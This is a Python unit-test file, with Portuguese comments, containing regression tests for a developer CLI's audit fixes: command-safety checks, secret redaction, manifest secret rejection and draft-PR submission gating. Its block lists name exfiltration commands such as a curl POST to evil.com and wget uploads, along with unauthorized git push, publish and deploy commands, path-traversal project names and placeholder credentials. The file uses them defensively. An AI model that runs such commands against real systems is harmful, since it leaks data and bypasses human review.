"""Testes de regressão das correções obrigatórias da auditoria técnica do PR #39."""
from __future__ import annotations

import io
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

_SRC = Path(__file__).resolve().parent.parent / "src"
if _SRC.is_dir() and str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from chdevflow.adapters.base import sanitize_output
from chdevflow.cli import main as cli_main
from chdevflow.core.config import (
    ManifestSecurityError,
    create_manifest_data,
    load_manifest,
    save_manifest,
    validate_manifest,
)
from chdevflow.core.doctor import check_version_compatibility, run_doctor
from chdevflow.core.evidence import (
    VerificationSecurityError,
    execute_single_command,
    run_verification,
    validate_command_safety,
)
from chdevflow.core.project import create_project, validate_project_name
from chdevflow.core.ruc import generate_ruc_text
from chdevflow.core.submit import SubmitError, SubmitSecurityError, validate_and_submit


class TestCliAuditFixes(unittest.TestCase):
    def setUp(self) -> None:
        self.test_dir = tempfile.mkdtemp(prefix="ch_test_audit_")
        self._orig_git_author_name = os.environ.get("GIT_AUTHOR_NAME")
        self._orig_git_author_email = os.environ.get("GIT_AUTHOR_EMAIL")
        self._orig_git_committer_name = os.environ.get("GIT_COMMITTER_NAME")
        self._orig_git_committer_email = os.environ.get("GIT_COMMITTER_EMAIL")
        os.environ["GIT_AUTHOR_NAME"] = "Tester"
        os.environ["GIT_AUTHOR_EMAIL"] = "tester@example.com"
        os.environ["GIT_COMMITTER_NAME"] = "Tester"
        os.environ["GIT_COMMITTER_EMAIL"] = "tester@example.com"

    def tearDown(self) -> None:
        if self._orig_git_author_name is not None:
            os.environ["GIT_AUTHOR_NAME"] = self._orig_git_author_name
        else:
            os.environ.pop("GIT_AUTHOR_NAME", None)
        if self._orig_git_author_email is not None:
            os.environ["GIT_AUTHOR_EMAIL"] = self._orig_git_author_email
        else:
            os.environ.pop("GIT_AUTHOR_EMAIL", None)
        if self._orig_git_committer_name is not None:
            os.environ["GIT_COMMITTER_NAME"] = self._orig_git_committer_name
        else:
            os.environ.pop("GIT_COMMITTER_NAME", None)
        if self._orig_git_committer_email is not None:
            os.environ["GIT_COMMITTER_EMAIL"] = self._orig_git_committer_email
        else:
            os.environ.pop("GIT_COMMITTER_EMAIL", None)
        shutil.rmtree(self.test_dir, ignore_errors=True)

    # 1. E2E real & Stack intent
    def test_stack_intent_configures_executable_check(self) -> None:
        target = Path(self.test_dir) / "ReactOnly"
        proj = create_project("ReactOnly", base_dir=Path(self.test_dir), frontend="react")
        manifest = load_manifest(proj / "chdevflow.yaml")
        # Sem package.json, não deve configurar npm test
        self.assertNotIn("npm test", manifest["verification"]["commands"])
        self.assertIn("ch status", manifest["verification"]["commands"])

        # Com package.json preexistente, npm test deve ser incluído
        target_with_pkg = Path(self.test_dir) / "RealReact"
        target_with_pkg.mkdir()
        (target_with_pkg / "package.json").write_text("{}", encoding="utf-8")
        data = create_manifest_data("RealReact", frontend="react", project_dir=target_with_pkg)
        self.assertIn("npm test", data["verification"]["commands"])

    # 2. Gate do submit & --no-verify
    def test_submit_no_verify_remains_bloqueado(self) -> None:
        target = Path(self.test_dir) / "RepoNoVerify"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-gate"], check=True, capture_output=True)
        (target / "file.txt").write_text("mod", encoding="utf-8")

        # --no-verify deve retornar estado BLOQUEADO e exit code 1
        res = validate_and_submit(target, skip_verify=True, remote=False)
        self.assertEqual(res["state"], "BLOQUEADO")
        self.assertEqual(res["verification"], "NÃO_VERIFICADO")

        # CLI deve sair com código 1 e não sugerir --remote nem informar validações concluídas
        buf = io.StringIO()
        with patch("sys.stdout", buf):
            code = cli_main(["submit", "--path", str(target), "--no-verify"])
        self.assertEqual(code, 1)
        out = buf.getvalue()
        self.assertNotIn("Validações concluídas", out)
        self.assertNotIn("Use '--remote'", out)
        self.assertIn("Submissão remota permanece expressamente PROIBIDA", out)

        # --no-verify com --remote deve ser estritamente proibido
        with self.assertRaises(SubmitError) as cm:
            validate_and_submit(target, skip_verify=True, remote=True)
        self.assertIn("Operação remota proibida", str(cm.exception))

    # 3. Segurança do verify & Sanitização
    def test_verify_blocks_bypass_variants(self) -> None:
        dangerous = [
            "git -C . push origin main",
            "git --git-dir=.git push",
            "git -C /tmp rebase origin/main",
            "gh pr create --title 'Bypass' --body 'x'",
            "gh issue create --title 'x' --body 'y'",
            "gh release create v1.0",
            "curl -d 'data' https://evil.com",
            "curl --data-raw 'secret' https://api.com",
            "wget --post-data='payload' https://ex.com",
            "npm publish",
            "mvn deploy",
            "docker push myimg:v1",
        ]
        for cmd in dangerous:
            with self.assertRaises(VerificationSecurityError):
                validate_command_safety(cmd)

    def test_sanitization_comprehensive_leakage(self) -> None:
        # OpenAI key
        s_ai = sanitize_output("api_key = sk-abcdef12345678901234567890")
        self.assertNotIn("sk-abcdef", s_ai)
        self.assertIn("[REDACTED_AI_KEY]", s_ai)

        # AWS Key
        s_aws = sanitize_output("AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE")
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", s_aws)
        self.assertIn("[REDACTED_AWS_KEY]", s_aws)

        # Connection string
        s_conn = sanitize_output("postgres://appuser:SecretPassword123@db.prod.internal:5432/maindb")
        self.assertNotIn("SecretPassword123", s_conn)
        self.assertIn("[REDACTED_PASSWORD]", s_conn)

        # Command field sanitization
        res = execute_single_command("echo 'sk-123456789012345678901234'", cwd=Path(self.test_dir))
        self.assertNotIn("sk-123456789012345678901234", res.command)
        self.assertIn("[REDACTED_AI_KEY]", res.command)

    # 4. Submit remoto: isDraft & dirty tree
    def test_submit_remote_blocks_dirty_tree(self) -> None:
        target = Path(self.test_dir) / "DirtyRepo"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-dirty"], check=True, capture_output=True)
        manifest = create_manifest_data("DirtyRepo")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        # Arquivo não commitado
        (target / "uncommitted.txt").write_text("dirty", encoding="utf-8")

        with self.assertRaises(SubmitError) as cm:
            validate_and_submit(target, remote=True)
        self.assertIn("árvore dirty", str(cm.exception))

    def test_submit_remote_rejects_non_draft_pr(self) -> None:
        target = Path(self.test_dir) / "NonDraftRepo"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-nondraft"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.name", "Tester"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.email", "tester@example.com"], check=True, capture_output=True)
        manifest = create_manifest_data("NonDraftRepo")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        (target / "committed.txt").write_text("clean", encoding="utf-8")
        subprocess.run(["git", "-C", str(target), "add", "."], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "commit", "-m", "initial"], check=True, capture_output=True)

        # Mock gh auth status OK e gh pr view retornando isDraft = False
        with patch("subprocess.run") as mock_run:
            def custom_run(cmd, *args, **kwargs):
                cmd_str = " ".join(cmd) if isinstance(cmd, list) else str(cmd)
                if "gh auth status" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="OK", stderr="")
                if "rev-list" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="1\n", stderr="")
                if "git status --porcelain" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
                if "git push" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
                if "gh pr view" in cmd_str:
                    # Retorna PR existente que NÃO é draft
                    return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps({"url": "https://github.com/pr/1", "isDraft": False, "state": "OPEN"}), stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

            mock_run.side_effect = custom_run
            with self.assertRaises(SubmitSecurityError) as cm:
                validate_and_submit(target, remote=True)
            self.assertIn("NÃO é um Draft PR", str(cm.exception))

    # 5. RUC divergência & FAIL
    def test_ruc_marks_divergent_evidence_nao_verificado(self) -> None:
        target = Path(self.test_dir) / "DivergentApp"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/branch-antiga"], check=True, capture_output=True)
        manifest = create_manifest_data("DivergentApp")
        manifest["verification"]["commands"] = ["echo 'pass'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        run_verification(target, persist=True)

        # Muda de branch sem re-executar verify
        subprocess.run(["git", "-C", str(target), "checkout", "-b", "agy/branch-nova"], check=True, capture_output=True)
        ruc_text = generate_ruc_text(target)
        self.assertIn("NÃO_VERIFICADO", ruc_text)
        self.assertIn("Branch divergente", ruc_text)
        self.assertNotIn("APROVADO_TECNICAMENTE", ruc_text)

    def test_ruc_fail_remains_bloqueado(self) -> None:
        target = Path(self.test_dir) / "FailingRucApp"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/branch-fail"], check=True, capture_output=True)
        manifest = create_manifest_data("FailingRucApp")
        manifest["verification"]["commands"] = ["exit 1"]
        save_manifest(target / "chdevflow.yaml", manifest)
        run_verification(target, persist=True)

        ruc_text = generate_ruc_text(target)
        self.assertIn("BLOQUEADO", ruc_text)
        self.assertNotIn("AGUARDANDO_PO", ruc_text)

    # 6. Validação de nome de projeto e .gitignore
    def test_project_name_validation(self) -> None:
        bad_names = ["../../../etc/cron.d", "../evil", "/root/malicious", "proj/sub", "invalid name!"]
        for bad in bad_names:
            with self.assertRaises(ValueError):
                validate_project_name(bad)

        self.assertEqual(validate_project_name("PulseOps"), "PulseOps")
        self.assertEqual(validate_project_name("my-app_01"), "my-app_01")

    def test_project_creates_and_preserves_gitignore(self) -> None:
        target = create_project("GitIgnoreProj", base_dir=Path(self.test_dir))
        gi = target / ".gitignore"
        self.assertTrue(gi.exists())
        self.assertIn(".ch/evidence/", gi.read_text(encoding="utf-8"))

    # 7. Doctor version compatibility
    def test_doctor_version_compatibility(self) -> None:
        # .NET: requer 10, instalado 8 -> incompatível
        compat_net, _ = check_version_compatibility("8.0.100", "10")
        self.assertFalse(compat_net)

        compat_net_ok, _ = check_version_compatibility("10.0.100", "10")
        self.assertTrue(compat_net_ok)

        # Python: requer 3.12, instalado 3.8 -> incompatível
        compat_py, _ = check_version_compatibility("3.8.10", "3.12")
        self.assertFalse(compat_py)

        compat_py_ok, _ = check_version_compatibility("3.14.8", "3.12")
        self.assertTrue(compat_py_ok)

    # 8. Auditoria 2 — Ciclo de ch submit --remote resolvido sem auto-dirty
    def test_submit_remote_clean_tree_success(self) -> None:
        """
        Inicia com: árvore limpa, branch feature, 1 commit à frente, verify PASS.
        Comprova que ch submit --remote alcança os mocks de gh/push, valida isDraft e
        retorna remote_executed=True sem ser bloqueado pelo próprio submit.
        """
        target = Path(self.test_dir) / "RemoteSuccessRepo"
        target.mkdir()

        subprocess.run(["git", "-C", str(target), "init", "-b", "feat/fatia-segura"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.name", "Tester"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.email", "tester@example.com"], check=True, capture_output=True)

        manifest = create_manifest_data("RemoteSuccessRepo")
        manifest["verification"]["commands"] = ["echo 'verify ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)

        (target / ".gitignore").write_text(".ch/evidence/\n", encoding="utf-8")
        (target / "app.py").write_text("print('feature!')\n", encoding="utf-8")

        # Commita tudo: árvore de trabalho fica 100% LIMPA
        subprocess.run(["git", "-C", str(target), "add", "."], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "commit", "-m", "feat: implementacao inicial"], check=True, capture_output=True)

        # Mocks para comandos remotos e simulação de 1 commit à frente
        executed_calls: list[str] = []
        orig_run = subprocess.run

        with patch("subprocess.run") as mock_run:
            def custom_run(cmd, *args, **kwargs):
                cmd_str = " ".join(cmd) if isinstance(cmd, list) else str(cmd)
                if "gh auth status" in cmd_str:
                    executed_calls.append(cmd_str)
                    return subprocess.CompletedProcess(cmd, 0, stdout="Logged in to github.com", stderr="")
                if "rev-list" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="1\n", stderr="")
                if "git" in cmd_str and "push" in cmd_str:
                    executed_calls.append(cmd_str)
                    return subprocess.CompletedProcess(cmd, 0, stdout="Everything up-to-date", stderr="")
                if "gh pr view" in cmd_str:
                    executed_calls.append(cmd_str)
                    return subprocess.CompletedProcess(
                        cmd,
                        0,
                        stdout=json.dumps({"url": "https://github.com/org/repo/pull/42", "isDraft": True, "state": "OPEN"}),
                        stderr="",
                    )
                if "gh pr edit" in cmd_str:
                    executed_calls.append(cmd_str)
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/org/repo/pull/42\n", stderr="")
                if "gh pr create" in cmd_str:
                    executed_calls.append(cmd_str)
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/org/repo/pull/42\n", stderr="")
                return orig_run(cmd, *args, **kwargs)

            mock_run.side_effect = custom_run

            res = validate_and_submit(target, remote=True)
            self.assertTrue(res["remote_executed"])
            self.assertEqual(res["state"], "AGUARDANDO_PO")
            self.assertEqual(res["verification"], "PASS")
            self.assertFalse(res["is_dirty"])
            self.assertIn("Draft PR existente identificado, validado e atualizado com RUC", res["remote_details"])

            # Comprova que git push, gh pr view e gh pr edit foram chamados para atualizar o RUC
            self.assertTrue(any("git" in c and "push" in c for c in executed_calls))
            self.assertTrue(any("gh pr view" in c for c in executed_calls))
            self.assertTrue(any("gh pr edit" in c for c in executed_calls))

        # Comprova que o diretório continua 100% limpo no git
        git_check = subprocess.run(["git", "-C", str(target), "status", "--porcelain"], capture_output=True, text=True, check=True)
        self.assertEqual(git_check.stdout.strip(), "")

    def test_submit_remote_creates_new_pr_and_preserves_custom_body(self) -> None:
        """
        Comprova que na criação de um novo Draft PR:
        - Se o PR não existe ainda (gh pr view retorna 1), chama gh pr create --draft.
        - Se for fornecido --body customizado, o corpo personalizado é preservado E o RUC é anexado.
        - Executa confirmação pós-criação com gh pr view.
        """
        target = Path(self.test_dir) / "NewPrRepo"
        target.mkdir()

        subprocess.run(["git", "-C", str(target), "init", "-b", "feat/nova-entrega"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.name", "Tester"], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "config", "user.email", "tester@example.com"], check=True, capture_output=True)

        manifest = create_manifest_data("NewPrRepo")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        (target / ".gitignore").write_text(".ch/evidence/\n", encoding="utf-8")
        (target / "code.py").write_text("x = 1\n", encoding="utf-8")

        subprocess.run(["git", "-C", str(target), "add", "."], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "commit", "-m", "feat: initial commit"], check=True, capture_output=True)

        executed_calls: list[str] = []
        captured_body: list[str] = []
        orig_run = subprocess.run

        with patch("subprocess.run") as mock_run:
            def custom_run(cmd, *args, **kwargs):
                cmd_str = " ".join(cmd) if isinstance(cmd, list) else str(cmd)
                executed_calls.append(cmd_str)
                if "gh auth status" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="OK", stderr="")
                if "rev-list" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="1\n", stderr="")
                if "git" in cmd_str and "push" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="push ok", stderr="")
                if "gh pr view" in cmd_str:
                    # Antes de gh pr create: PR não existe ainda (código 1)
                    if not any("gh pr create" in c for c in executed_calls):
                        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="not found")
                    # Após gh pr create: confirmação (código 0, isDraft=True)
                    return subprocess.CompletedProcess(
                        cmd,
                        0,
                        stdout=json.dumps({"url": "https://github.com/org/repo/pull/99", "isDraft": True, "state": "OPEN"}),
                        stderr="",
                    )
                if "gh pr create" in cmd_str:
                    if isinstance(cmd, list) and "--body" in cmd:
                        idx = cmd.index("--body")
                        captured_body.append(cmd[idx + 1])
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/org/repo/pull/99\n", stderr="")
                return orig_run(cmd, *args, **kwargs)

            mock_run.side_effect = custom_run

            res = validate_and_submit(target, remote=True, body="Corpo customizado pelo desenvolvedor")
            self.assertTrue(res["remote_executed"])
            self.assertEqual(res["state"], "AGUARDANDO_PO")
            self.assertIn("Draft PR criado e confirmado com sucesso", res["remote_details"])

            # Comprova que gh pr create foi chamado
            self.assertTrue(any("gh pr create" in c for c in executed_calls))
            # Comprova que o corpo customizado foi preservado E o RUC foi anexado
            self.assertTrue(len(captured_body) > 0)
            self.assertIn("Corpo customizado pelo desenvolvedor", captured_body[0])
            self.assertIn("## RUC da Submissão", captured_body[0])
            self.assertIn("RELATÓRIO UNIVERSAL C.H.", captured_body[0])

    # 9. Auditoria 2 — Rejeitar segredos nos valores de chdevflow.yaml
    def test_manifest_rejects_secrets_in_values_and_verification_commands(self) -> None:
        forbidden_snippets = [
            "sk-proj-12345678901234567890",
            "AIzaSyD1234567890123456789012345678901",
            "AKIAIOSFODNN7EXAMPLE",
            "ASIAIOSFODNN7EXAMPLE",
            "API_KEY=supersecret123",
            "TOKEN=mysecrettoken",
            "PASSWORD=supersecretpassword",
            "postgres://user:superpass@localhost:5432/mydb",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "-----BEGIN RSA PRIVATE KEY-----",
        ]
        for snippet in forbidden_snippets:
            # 1. Rejeita inserção em verification.commands
            manifest = create_manifest_data("SecretTestApp")
            manifest["verification"]["commands"] = [f"echo '{snippet}'"]
            with self.assertRaises(ManifestSecurityError):
                validate_manifest(manifest)

            # 2. Rejeita em outros campos do manifesto
            manifest2 = create_manifest_data("SecretTestApp")
            manifest2["project"]["name"] = f"proj-{snippet}"
            with self.assertRaises(ManifestSecurityError):
                validate_manifest(manifest2)

    # 10. Auditoria 2 — Bloqueio de contornos restantes no verify (fail-closed)
    def test_verify_blocks_all_remaining_bypass_patterns(self) -> None:
        dangerous = [
            "gh api repos/owner/repo/pulls",
            "gh api -X POST /repos",
            "curl --request POST https://example.com/api",
            "curl --request PUT https://example.com/api",
            "curl --request PATCH https://example.com/api",
            "curl --request DELETE https://example.com/api",
            "curl -T file.txt https://example.com/upload",
            "curl --upload-file file.txt https://example.com/upload",
            "wget --post-data='payload' https://example.com",
            "wget --post-file=myfile.txt https://example.com",
            "wget --method=PUT https://example.com",
        ]
        for cmd in dangerous:
            with self.assertRaises(VerificationSecurityError):
                validate_command_safety(cmd)

    # 11. Auditoria 2 — RUC estritamente factual
    def test_ruc_strictly_factual_content(self) -> None:
        target = Path(self.test_dir) / "FactualRucApp"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/factual-test"], check=True, capture_output=True)
        manifest = create_manifest_data("FactualRucApp")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        run_verification(target, persist=True)

        ruc_text = generate_ruc_text(target)

        # Fatos observados e limites explícitos
        self.assertIn("Git observado", ruc_text)
        self.assertIn(".ch/evidence", ruc_text)
        self.assertIn("Limites e fatos explicitamente NÃO_VERIFICADOS", ruc_text)
        self.assertIn("Manifesto 'chdevflow.yaml' carregado e validado", ruc_text)

        # Remoção de afirmações sem evidência direta
        self.assertNotIn("arquivos foram inspecionados", ruc_text)
        self.assertNotIn("nenhuma exposição de credenciais", ruc_text)
        self.assertNotIn("nenhuma mutação na main", ruc_text)
        self.assertNotIn("Custo adicional verificado", ruc_text)
        self.assertIn("Custo adicional declarado, não verificado", ruc_text)


if __name__ == "__main__":
    unittest.main()
